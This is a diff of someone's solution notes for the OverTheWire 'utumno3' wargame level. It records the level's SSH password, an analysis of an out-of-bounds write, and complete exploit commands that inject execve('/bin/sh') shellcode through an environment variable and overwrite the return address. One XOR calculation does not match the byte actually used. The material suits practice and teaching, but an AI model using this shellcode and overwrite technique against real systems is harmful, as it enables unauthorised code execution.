@@ -1,2 +1,45 @@
-ssh -p 2227 utumno3@utumno.labs.overthewire.org
+ssh -p 2227 utumno3@utumno.labs.overthewire.org  
 pass: zuudafiine
+
+I've disassembled the binary and I noticed that there's an out-of-bounds write.
+We first read a character from STDIN, and xor it with (3 * i).
+The output is used as an index for the second buffer write.
+
+Doing this,
+we can inject a payload, say as an environment variable,
+and then overwrite the return address using the out-of-bounds vulnerability to jump to the shellcode.
+
+In order to do this,
+we'd need to carefully calculate the index so that it aims at the exact byte that we want,
+and carefully write the adress of the shellcode to it.
+
+
+
+Breakpoint first getchar: 0x08048455
+Breakpoint second getchar: 0x08048440
+
+
+Shellcode address: 0xffffdeec
+EBP: 0xffffdcb8
+Return address: [ebp+0x4]
+second_buf address: [ebp-0x24]
+
+c ^ (3 * 0) = 0x28
+c = 0x28
+
+c ^ (3 * 1) = 0x29
+c = 0x2a
+
+c ^ (3 * 2) = 0x2a
+c = 0x2c
+
+c ^ (3 * 3) = 0x2b
+c = 0x38
+
+# GDB
+env -i SHELL=/usr/bin/bash A=$(python -c "print '\x90' * 200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'") gdb -q utumno3
+r <<< $(python -c "print '\x28\xec\x2a\xde\x2c\xff\x22\xff' + 'A' * 50")
+
+# Prod
+env -i SHELL=/usr/bin/bash A=$(python -c "print '\x90' * 200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'") /bin/bash
+(python -c "print '\x28\xec\x2a\xde\x2c\xff\x22\xff' + 'A' * 50"; cat) | ./utumno3
